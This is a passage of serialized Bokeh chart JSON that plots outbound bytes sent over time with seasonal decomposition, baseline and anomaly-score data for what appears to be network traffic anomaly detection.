:\"little\"}],[\"trend\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"XlQAAH1TAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"seasonal\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"iSkAAFQhAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"weights\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AQAAAAEAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"baseline\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"6H0AANJ0AAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"score\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"lDb1kSziGEBDb2xVUTkYQA==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p1168\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p1169\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1164\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"TotalBytesSent\"},\"size\":{\"type\":\"value\",\"value\":12},\"line_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"fill_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"marker\":{\"type\":\"value\",\"value\":\"circle_x\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1165\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"TotalBytesSent\"},\"size\":{\"type\":\"value\",\"value\":12},\"line_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"circle_x\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p1166\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"TotalBytesSent\"},\"size\":{\"type\":\"value\",\"value\":12},\"line_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"firebrick\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"circle_x\"}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p1057\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"HoverTool\",\"id\":\"p1004\",\"attributes\":{\"renderers\":\"auto\",\"tooltips\":[[\"TimeGenerated\",\"@TimeGenerated{%F %T.%3N}\"],[\"TotalBytesSent\",\"@TotalBytesSent\"],[\"residual\",\"@residual\"],[\"trend\",\"@trend\"],[\"seasonal\",\"@seasonal\"],[\"weights\",\"@weights\"],[\"baseline\",\"@baseline\"],[\"score\",\"@score\"]],\"formatters\":{\"type\":\"map\",\"entries\":[[\"@TimeGenerated\",\"datetime\"]]}}},{\"type\":\"object\",\"name\":\"WheelZoomTool\",\"id\":\"p1119\",\"attributes\":{\"dimensions\":\"width\"}},{\"type\":\"object\",\"name\":\"BoxZoomTool\",\"id\":\"p1120\",\"attributes\":{\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p1121\",\"attributes\":{\"syncable\":false,\"level\":\"overlay\",\"visible\":false,\"left_units\":\"canvas\",\"right_units\":\"canvas\",\"bottom_units\":\"canvas\",\"top_units\":\"canvas\",\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":2,\"line_dash\":[4,4],\"fill_color\":\"lightgrey\",\"fill_alpha\":0.5}}}},{\"type\":\"object\",\"name\":\"ResetTool\",\"id\":\"p1122\"},{\"type\":\"object\",\"name\":\"SaveTool\",\"id\":\"p1123\"},{\"type\":\"object\",\"name\":\"PanTool\",\"id\":\"p1124\",\"attributes\":{\"dimensions\":\"width\"}}]}},\"toolbar_location\":\"above\",\"left\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p1112\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p1113\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"NumeralTickFormatter\",\"id\":\"p1135\",\"attributes\":{\"format\":\"00\"}},\"axis_label\":\"TotalBytesSent\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p1115\"}}}],\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p1069\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p1070\",\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p1071\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p1072\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p1073\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1074\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1075\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1076\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p1077\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1078\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1079\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1080\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p1081\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p1082\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p1133\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"axis_label\":\"TimeGenerated\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p1084\"}}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p1111\",\"attributes\":{\"axis\":{\"id\":\"p1069\"},\"grid_line_color\":null}},{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p1118\",\"attributes\":{\"dimension\":1,\"axis\":{\"id\":\"p1112\"},\"grid_line_color\":null}},{\"type\":\"object\",\"name\":\"Legend\",\"id\":\"p1146\",\"attributes\":{\"location\":\"top_left\",\"click_policy\":\"hide\",\"items\":[{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p1147\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"observed\"},\"renderers\":[{\"id\":\"p1143\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p1157\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"baseline\"},\"renderers\":[{\"id\":\"p1154\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p1170\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"anomalies\"},\"renderers\":[{\"id\":\"p1167\"}]}}]}}],\"min_border_left\":50}},{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p1217\",\"attributes\":{\"width\":1200,\"height\":120,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p1227\",\"attributes\":{\"start\":1593903420000.0,\"end\":1594684980000.0}},\"y_range\":{\"type\":\"object\",\"name\":\"DataRange1d\",\"id\":\"p1219\"},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p1231\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p1233\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p1220\",\"attributes\":{\"text\":\"Range Selector\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p1291\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p1282\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p1284\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p1283\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAEAAAACAAAAAwAAAAQAAAAFAAAABgAAAAcAAAAIAAAACQAAAAoAAAALAAAADAAAAA0AAAAOAAAADwAAABAAAAARAAAAEgAAABMAAAAUAAAAFQAAABYAAAAXAAAAGAAAABkAAAAaAAAAGwAAABwAAAAdAAAAHgAAAB8AAAAgAAAAIQAAACIAAAAjAAAAJAAAACUAAAAmAAAAJwAAACgAAAApAAAAKgAAACsAAAAsAAAALQAAAC4AAAAvAAAAMAAAADEAAAAyAAAAMwAAADQAAAA1AAAANgAAADcAAAA4AAAAOQAAADoAAAA7AAAAPAAAAD0AAAA+AAAAPwAAAEAAAABBAAAAQgAAAEMAAABEAAAARQAAAEYAAABHAAAASAAAAEkAAABKAAAASwAAAEwAAABNAAAATgAAAE8AAABQAAAAUQAAAFIAAABTAAAAVAAAAFUAAABWAAAAVwAAAFgAAABZAAAAWgAAAFsAAABcAAAAXQAAAF4AAABfAAAAYAAAAGEAAABiAAAAYwAAAGQAAABlAAAAZgAAAGcAAABoAAAAaQAAAGoAAABrAAAAbAAAAG0AAABuAAAAbwAAAHAAAABxAAAAcgAAAHMAAAB0AAAAdQAAAHYAAAB3AAAAeAAAAHkAAAB6AAAAewAAAHwAAAB9AAAAfgAAAH8AAACAAAAAgQAAAIIAAACDAAAAhAAAAIUAAACGAAAAhwAAAIgAAACJAAAAigAAAIsAAACMAAAAjQAAAI4AAACPAAAAkAAAAJEAAACSAAAAkwAAAJQAAACVAAAAlgAAAJcAAACYAAAAmQAAAJoAAACbAAAAnAAAAJ0AAACeAAAAnwAAAKAAAAChAAAAogAAAKMAAACkAAAApQAAAKYAAACnAAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndCAABAjbsyd0IAACj8vjJ3QgAAEGvCMndCAAD42cUyd0IAAOBIyTJ3QgAAyLfMMndCAACwJtAyd0IAAJiV0zJ3QgAAgATXMndCAABoc9oyd0IAAFDi3TJ3QgAAOFHhMndCAAAgwOQyd0IAAAgv6DJ3QgAA8J3rMndCAADYDO8yd0IAAMB78jJ3QgAAqOr1MndCAACQWfkyd0IAAHjI/DJ3QgAAYDcAM3dCAABIpgMzd0IAADAVBzN3QgAAGIQKM3dCAAAA8w0zd0IAAOhhETN3QgAA0NAUM3dCAAC4Pxgzd0IAAKCuGzN3QgAAiB0fM3dCAABwjCIzd0IAAFj7JTN3QgAAQGopM3dCAAAo2Swzd0IAABBIMDN3QgAA+LYzM3dCAADgJTczd0IAAMiUOjN3QgAAsAM+M3dCAACYckEzd0IAAIDhRDN3QgAAaFBIM3dCAABQv0szd0IAADguTzN3QgAAIJ1SM3dCAAAIDFYzd0IAAPB6WTN3QgAA2OlcM3dCAADAWGAzd0IAAKjHYzN3QgAAkDZnM3dCAAB4pWozd0IAAGAUbjN3QgAASINxM3dCAAAw8nQzd0IAABhheDN3QgAAANB7M3dCAADoPn8zd0IAANCtgjN3QgAAuByGM3dCAACgi4kzd0IAAIj6jDN3QgAAcGmQM3dCAABY2JMzd0IAAEBHlzN3QgAAKLaaM3dCAAAQJZ4zd0IAAPiToTN3QgAA4AKlM3dCAADIcagzd0IAALDgqzN3QgAAmE+vM3dCAACAvrIzd0IAAGgttjN3QgAAUJy5M3dCAAA4C70zd0IAACB6wDN3QgAACOnDM3dCAADwV8czd0IAANjGyjN3QgAAwDXOM3dCAACopNEzd0IAAJAT1TN3QgAAeILYM3dCAABg8dszd0IAAEhg3zN3QgAAMM/iM3dCAAAYPuYzd0IAAACt6TN3QgAA6BvtM3dCAADQivAzd0IAALj58zN3QgAAoGj3M3dCAACI1/ozd0IAAHBG/jN3QgAAWLUBNHdCAABAJAU0d0IAACiTCDR3QgAAEAIMNHdCAAD4cA80d0IAAODfEjR3QgAAyE4WNHdCAACwvRk0d0IAAJgsHTR3QgAAgJsgNHdCAABoCiQ0d0IAAFB5JzR3QgAAOOgqNHdCAAAgVy40d0IAAAjGMTR3QgAA8DQ1NHdCAADYozg0d0IAAMASPDR3QgAAqIE/NHdCAACQ8EI0d0IAAHhfRjR3QgAAYM5JNHdCAABIPU00d0IAADCsUDR3QgAAGBtUNHdC\"},\"shape\":[168],\"dtype\":\"float64\",\"order\":\"little\"}],[\"TotalBytesSent\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"RyoAAOU5AADcNAAAqy4AALkrAADJMwAAPzQAAEdtAAANewAAZ3AAAKZ6AADTgAAA8X0AAAODAAAEbwAAnWQAAON4AACbbAAAxXMAAOZzAAArLQAAmTQAABM1AAB3OgAApDIAACI2AAA/MwAAUzYAAMMxAADbKwAABCwAAFp6AAA7aAAA1oAAACB/AAC2egAAXm4AAMV0AAA6egAArm4AANhmAABQZwAAcHcAAEl4AAD0KAAAkzoAAMMtAAAgLAAA9ygAACUqAACmOQAA9ioAALopAADsOAAAeTUAAHeFAACWagAAo4QAAKSDAAC6aAAA13cAAC17AADLgwAAL4AAAL5lAABrawAAtoQAAL5xAAAVMgAAJDIAAPs1AAAdOgAAjDcAAEUnAABiOQAAaTMAAP43AAAGMgAA+y0AAMhjAADbagAA8YMAAK9pAACobAAAiH8AAFZkAACTfQAAU4IAAPtwAAA7ewAAJ4MAAAFnAACiOQAArygAAC4oAAA2LwAAliwAAEM6AACPOAAA7zYAAJszAADFMAAApzkAAFRpAADtegAAZmYAABSDAABUfwAAPmIAAFh5AAD6YgAAcmQAAOllAABJZAAA6L0AACCzAACGLQAARzMAAJgvAABjNwAAETYAAFkrAACcNQAAJykAACYnAAAaMQAAQTcAAClIAAAVTAAAiEoAANZEAAAlSQAAzEQAABVNAACKSwAA4EgAAERFAACJRQAAJz8AAGVAAAC/LAAAMSkAAKc2AADLKQAAvzEAAF8xAAClOAAAvTAAAOksAABhJwAA0S0AAMlGAAAyRAAAuEYAAHxAAACWRQAAbkAAALREAABxSAAATkwAANU+AACsOwAAAzwAAPZGAAAGNgAAJjQAAEIuAABnKwAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"residual\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"lP7//y0DAAD7AAAA3f7//4f///9nAgAAAAQAAH/1//8KCAAAPPX//4P7//+WAwAAvAIAADEDAAD+9v//f/j//5sGAABMAQAAxAIAAG4DAACPAgAAU/7//0ADAAD6BQAAjwQAAAsCAABQ/f//ewUAAGwDAADb+f///Pr//z4FAAAp+P//AQYAAFIDAABPAwAAWPf//6P7//9bAwAAuP///2j5//9o/P//1v3//wEFAAAn/P//4AYAABn9//8I+P//4Pn//wL5//+NAgAAQ/n//0j5//8OBgAAgwIAAHUSAABi+///JQkAAIUIAAA68///PwIAAHoEAAAVCwAAkAsAAM/4//9A/f//if7//7P2//9/////+fz//+oCAACPAwAAugUAAB33///V////yAAAAPgFAAA8/v//avn//5f1//+E/v//vgwAALnz//++/f//cRAAAMT0///LCQAAAg8AAP4JAADuDwAA2Pb//9zp//+gBQAAP/b//1L1//82+P//2fT//2UEAAA/+f//q/7//wr8//9f9///f/z//3MAAAD/DwAAWPb//yoUAABXEgAAQ/j//04MAABg9P//mPX//30BAABQ/v///z8AAE0+AACd8///xvz//7v4//84AQAA2f7//0X3///7+v//gvf//9X4///RAwAAFgUAAN34//89+f//ufn//3z1///R9///TPv//6r9//+k/f//svn//yP+///n/v///Ob//5Ho//82AQAA4/////sLAACaAQAA6QQAAAgGAACNBgAArwYAAOkFAADlAAAAgv7//0kGAACC/f//NgYAACYAAADM/f//ZwMAAGT9//+FBAAA4wUAAEL+///4/f//F/b//zn4///kAgAAjwIAAE77//+I/v//\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"trend\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"t1UAAMlVAADZVQAA6lUAAPpVAAAKVgAAGlYAAChWAAA2VgAARFYAAFBWAABbVgAAZVYAAG9WAAB3VgAAflYAAIRWAACKVgAAjlYAAJNWAACYVgAAnlYAAKZWAACxVgAApVYAAJlWAACLVgAAeVYAAGRWAABJVgAAKlYAAAVWAADcVQAAslUAAIlVAABjVQAAQlUAACdVAAAVVQAAC1UAAApVAAARVQAAI1UAAD1VAABfVQAAiFUAALVVAADiVQAADlYAADlWAABiVgAAiVYAAK9WAADTVgAA+FYAABxXAABBVwAAZFcAAIRXAACgVwAAt1cAAMlXAADVVwAA3FcAAN9XAADdVwAA11cAAM1XAADCVwAAtVcAAKVXAACRVwAAelcAAF9XAAA/VwAAG1cAAPNWAADJVgAAnFYAAGxWAAA6VgAACFYAANdVAACqVQAAhFUAAGdVAABTVQAASlUAAExVAABZVQAAblUAAIhVAAClVQAAyVUAAPhVAAAyVgAAdlYAAMBWAAALVwAAU1cAAJJXAADHVwAA7VcAAAVYAAANWAAABlgAAPBXAADLVwAAlVcAAExXAADsVgAAcVYAANtVAAApVQAAXlQAAH1TAACIUgAAfFEAAFpQAAAhTwAA1U0AAHlMAAARSwAApEkAADZIAADPRgAAckUAACREAADnQgAAvEEAAKVAAACkPwAAvD4AAO89AABCPQAAtjwAAEo8AAD3OwAAtTsAAH87AABSOwAALjsAABE7AAD8OgAA7ToAAOI6AADSOgAAwToAALE6AACjOgAAlToAAIg6AAB7OgAAbToAAF86AABROgAAQToAADA6AAAdOgAACjoAAPQ5AADdOQAAxDkAAKk5AACNOQAAbjkAAE45AAAsOQAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"seasonal\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"/NX//+/g//8H3v//5Nn//zjW//9Y2///Jdr//58hAADLHAAA5iQAANMoAADhJgAAziQAAGEpAACPIQAAoBUAAMMbAADEFAAAcRoAAOQZAAAD1P//qN///yzb///M3f//b9f//33d//9l3///Xtr///LX//+42///39r//xYfAAA2GgAAIiUAAEQmAAACIgAAxCEAAPojAADIIQAA6hkAAGUYAADWFQAAdyQAAAoeAABu1///K97///ba//823v//Ctn//+va//+34P//K9v//8TZ//8K3P///tv//+QbAADzFwAAGCQAAJkjAADgHQAA4B0AAOkeAADgIAAAwRwAABAVAABOFgAAVi4AAD0jAADU2v//dt3//2zb///83v//V9r//8nY//9O4v//hdv//xLb//8C3f//9t3//8QXAAAdFgAAKiEAAB8gAAA/GQAAkhkAACsaAAB0HgAABh4AALARAADyFQAA4DYAAJwnAABc3v//qNz//+Tc///O4P//R+H//x7f//9G6P//8uD////f//+g4f//O+X//9sQAADgEgAABxgAAPgWAAAwFQAAZRIAAL0VAACuFwAAaBgAAI8OAADPEAAAiSkAAFQhAABi5///BuX//4Tm//8J5///Y+n//5vn//+Q7///Auj//xvm//965v//uOz//ycLAADxDwAAEg8AALQOAACvEQAAxAoAAHsRAACjEAAAdxIAANcKAACqCgAAdhwAAFUcAAA38P//IO7//5rv//817f//6fH//3Xw//9G9///Te///07s///Z6///uvT///cFAAA0DAAAEwYAAPUFAAB5DQAAxQIAAB8NAADNCQAAYAwAAJ8GAADWAwAAJwwAABMVAACV+f//KPj//6f5//+z8///\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"weights\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"baseline\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"sysAALc2AADgMwAAzi8AADIsAABhMQAAPjAAAMh3AAACcwAAK3sAACN/AAA8fQAANHsAANF/AAAGeAAAHmwAAEdyAABOawAAAHEAAHdwAACbKgAARjYAANIxAAB8NAAAFC4AABY0AADvNQAA1zAAAFYuAAAAMgAACDEAABt1AAAScAAA1HoAAM17AABmdwAABncAACJ5AADedgAA9m4AAHBtAADoagAAmnkAAEdzAADNLAAAsjMAAKowAAAYNAAAFy8AACMxAAAYNwAAszEAAHIwAADdMgAA9TIAAAFzAAA0bwAAfXsAAB57AACAdQAAl3UAALJ2AAC1eAAAnnQAAO9sAAArbgAALYYAAAt7AACWMgAAKzUAABAzAACNNgAA0TEAACgwAACNOQAAoDIAAAUyAADKMwAAkTQAADFuAABXbAAAMncAAPZ1AADqbgAAFm8AAJJvAADHcwAAUHMAAPxmAABMawAAT4wAACV9AAABNAAAcDIAANwyAAAANwAAvTcAAN01AABQPwAARDgAAJE3AABmOQAAKD0AAOBoAADtagAADnAAAOluAAD8bAAA+2kAAAltAACabgAA2m4AAGtkAAD5ZQAA6H0AANJ0AADpOQAAgTYAAN02AAAqNgAAODcAABQ0AAChOgAApTEAAFEuAABILQAAKjIAAExPAADYUgAAz1AAAFpPAABUUQAAgEkAAGtPAADmTQAALk8AACFHAACiRgAAK1gAANRXAACIKwAATikAAKsqAAAwKAAA1SwAAFYrAAAXMgAADSoAAP8mAAB7JgAATy8AAH9AAACwRgAAgUAAAFVAAADKRwAABj0AAFBHAADrQwAAakYAAJNAAAC0PQAA7EUAAL1OAAAhMwAAljEAAPQyAADfLAAA\"},\"shape\":[168],\"dtype\":\"int32\",\"order\":\"little\"}],[\"score\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"wXsqBZ0ywr+h30T8qIXTPy3+xdGRbLc/Qy/71X1Lvb/w3KS70YSpvwZYxigsas0/H8eTFymn2D/p2TyNrWjwvwJVXrD35eg/q6FE3vLQ8L99K6a3BjDcv3UMLTlME9Y/HERoszjG0D/6Fj+Cj57TPyOaTsw+Key/nvKk3Oh6578FqiduqG/kPy+B8TWCTb8/zbJcvwX40D8A42b9ShrVP/GqUqAuXM8/foJuB+Fbxb+GZqn47/vTPy8Q3CWJeuI/vQFFTVoh3D8eZtAVwPDIP+PAwOY++tC/kuH3lj3v4D9Ux2m61w3VPxOLoBi9P+O/afdi4Wp437+P+2PZXzHgP5XF5vyWhui/nQAX21KQ4j+UX49T/WvUPxK2E29QWdQ/f6sPaR0R67+5cNSH0mjbvxtcAgEEpNQ/G1q34yT5n7+rZo3erqXkv/JKcUF5nta/mwUFvShwy78YK6A3BOfeP1BOk0IbM9i/Yce1sWxG5T/kOfGYoFDSv+PpjuVN7ei/eyjkBC0w479UqMMKKuPlv5hzWBpIQ88/paYyCtkY5b8NRHb2SAnlv42azXTJuOI/3l51fMfGzj/1E4s0lan8Pxh09oh0/dy/3brRc9JW7D/zZ0X8z2TqP6fTSm7g8PO/HAU6sSl4yz8sX+MNoJ7bPyeRNXNTL/E/oBopmb/u8T8oyd6g54Hmv0Weqf7YXdG/KKwK5pC7wr8BYVj0rxLtv3lSSBs6E6u/qfTCyNQX07+WwCW4k+TRP5ort86459U/a1UK9lSz4T+sAyWFwcjrv/1FVi6wsJS/ivfsIKV2sj9Zgl2ET3TiP/j+Kww8esa/1dgOPXWf5L/khkXEU0Pwv4U2/DTR+cK/R+/7ub7E8z9ZvNimOivzv8GdvwT3msy/DpvF04qG+T/DQBnLs4vxv0q32c+BW+4/kEWqMmNL9z8f2PRlP/ruP+r11Gqruvg/ByGzyIWf7L9O/RMPa0IBwIshncJnYuE/hYMEi7577r+SlQzmta7wv6YrMGMgXui/H9hAOwVr8b+bvIHO5RvbP1HCL01MJeW/R/9sAEIUwb+RX+mNoufYvxK71LNT++q/tYwSv0sP1r9ILrFJNWSkP7jQLlkg1fg/kJZWKO4t7r+XG81frVH/Py/sVfnkevw/tpF5yak16L/bayQQcRbzP60adZBUJ/K/buPlW8VB8L+QDGvt0AjCP4PVZdA6gcW/lDb1kSziGEBDb2xVUTkYQDSdThHOVvO/UTb59E9V1L+GU9DvJ8Dmv0QuZb5/W70/pQzk7Revvb/x7kHnQEzrvz+F4YKkft+/7giuKWOO6r+mH2O8Om/mv8+8V3GUgtc/qc0Bd75p3z9N6Gg2VFbmvydQru6FK+W/S/YH0pCp479JxFvGWG3wv2Qmp75+mOm/f6TWaWiG3b83x4VA+JPNv0BtdNKr3s2/uOZCh1q/47/LsuOWfbHHv84FNZp8Ury/QvaOGCF/A8DJKeiI+0MCwJO/cLKyKb0/P1U0v4V8jr/AbCI5RZXyPxQvF4TfccM/Bd/CE51R3j8K8VGQHKbiPyrJsQMVROQ/YjQZveit5D+TWihJn0XiP5E8RU7CSLU/3W32urcSw7+68uKQbXDjPyEaErj6hc+/R6+wEko14z8cjK/EIqaFP1Ya6Fqp7Mu/JQLxkrfu1D8prN1Ivn3Qv193U/4Z49s/EbGsZPIy4j/uWD16iC/Gv7pYZ9fZyMm/P5jnKD/47r/kVvLwyVTov5JtLu85v9E/8apSoC5czz/SiNkm9Xndv9THBykEyMK/\"},\"shape\":[168],\"dtype\":\"float64\",\"order\":\"little\"}],[\"anomalies\",{\"type\":\"ndarray\",\"